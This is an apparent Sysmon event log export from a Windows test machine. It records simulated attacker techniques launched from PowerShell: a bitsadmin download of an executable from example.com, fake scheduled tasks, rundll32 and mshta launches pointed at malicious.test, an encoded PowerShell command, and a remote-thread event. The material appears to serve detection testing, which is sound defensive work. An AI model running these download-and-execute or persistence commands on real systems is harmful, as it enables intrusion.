Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job6 http://example.com/file.exe C:\Temp\file6.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:50 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:03:50.045
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask6
CreationUtcTime: 2025-11-27 18:03:50.045
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.912
ProcessGuid: {3a35410f-9285-6928-2011-000000000b00}
ProcessId: 2892
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job6 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:20.394
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57067
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 172.64.41.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:20.349
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57066
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 162.159.61.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:20.270
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 63207
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.806
ProcessGuid: {3a35410f-9285-6928-1e11-000000000b00}
ProcessId: 12916
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask6 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.719
ProcessGuid: {3a35410f-9285-6928-1d11-000000000b00}
ProcessId: 13628
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=renderer --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --device-scale-factor=1 --num-raster-threads=2 --enable-main-frame-before-activation --renderer-client-id=13 --time-ticks-at-unix-epoch=-1764255096121325 --launch-time-ticks=11534040364 --metrics-shmem-handle=5452,i,8228094657574864466,2825711166186913204,2097152 --field-trial-handle=2116,i,4317584078096433513,18029839939329323353,262144 --variations-seed-version=main@69c2005032bb14f803911c3458ab063c42bfa450 --trace-process-track-uuid=3190708998493415531 --mojo-platform-channel-handle=6072 /prefetch:1
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\142.1.84.141\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-c9e6-200000000000}
LogonId: 0x20E6C9
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-927d-6928-c610-000000000b00}
ParentProcessId: 11048
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --disable-domain-reliability --enable-dom-distiller --enable-distillability-service --origin-trial-public-key=bYUKPJoPnCxeNvu72j4EmPuK7tr1PAC7SHh8ld9Mw3E=,fMS4mpO6buLQ/QMd+zJmxzty/VQ6B1EUZqoCU04zoRU= --lso-url=https://no-thanks.invalid --variations-server-url=https://variations.brave.com/seed --variations-insecure-server-url=https://variations.brave.com/seed --flag-switches-begin --flag-switches-end --component-updater=url-source=https://go-updater.brave.com/extensions --do-not-de-elevate --single-argument http://malicious.test/1
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:03:49.660
ProcessGuid: {3a35410f-9285-6928-1411-000000000b00}
ProcessId: 9188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_oc5f13fm.tqs.ps1
CreationUtcTime: 2025-11-27 18:03:49.660
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.604
ProcessGuid: {3a35410f-9285-6928-1b11-000000000b00}
ProcessId: 7300
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask6 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:20.179
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57064
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 172.64.41.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:20.091
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57062
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 162.159.61.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.493
ProcessGuid: {3a35410f-9285-6928-1a11-000000000b00}
ProcessId: 7176
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x12c,0x130,0x134,0xfc,0x138,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-9285-6928-1811-000000000b00}
ParentProcessId: 1748
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/5
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.480
ProcessGuid: {3a35410f-9285-6928-1911-000000000b00}
ProcessId: 6688
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/6 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.438
ProcessGuid: {3a35410f-9285-6928-1811-000000000b00}
ProcessId: 1748
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/5
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-9284-6928-0511-000000000b00}
ParentProcessId: 11844
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/5 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:03:49.376
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-9285-6928-1711-000000000b00}
TargetProcessId: 11708
TargetImage: <unknown process>
NewThreadId: 7540
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.344
ProcessGuid: {3a35410f-9285-6928-1611-000000000b00}
ProcessId: 15200
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test6') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.743
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 49285
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 162.159.61.3
DestinationHostname: -
DestinationPort: 443
DestinationPortName: https"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.716
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 55565
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.716
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 55487
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.715
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 54719
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:49 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.715
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: udp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 58693
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 1.0.0.1
DestinationHostname: one.one.one.one
DestinationPort: 53
DestinationPortName: domain"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.063
ProcessGuid: {3a35410f-9285-6928-1411-000000000b00}
ProcessId: 9188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwA1ACcA 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:49 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:49.007
ProcessGuid: {3a35410f-9285-6928-1211-000000000b00}
ProcessId: 12392
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:03:48.988
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask5
CreationUtcTime: 2025-11-27 18:03:48.987
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.925
ProcessGuid: {3a35410f-9284-6928-1011-000000000b00}
ProcessId: 6436
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job5 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:03:48.829
ProcessGuid: {3a35410f-9284-6928-0e11-000000000b00}
ProcessId: 12260
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job5 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:33:48 PM","3","Information","Network connection detected:
RuleName: -
UtcTime: 2025-11-27 18:03:19.317
ProcessGuid: {3a35410f-923f-6928-c80f-000000000b00}
ProcessId: 15028
Image: C:\Windows\System32\wbem\WMIC.exe
User: DESKTOP-EJG8QJC\Emil Jinu
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.0.2.15
SourceHostname: DESKTOP-EJG8QJC
SourcePort: 57054
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 8.8.4.4
DestinationHostname: dns.google
DestinationPort: 443
DestinationPortName: https"
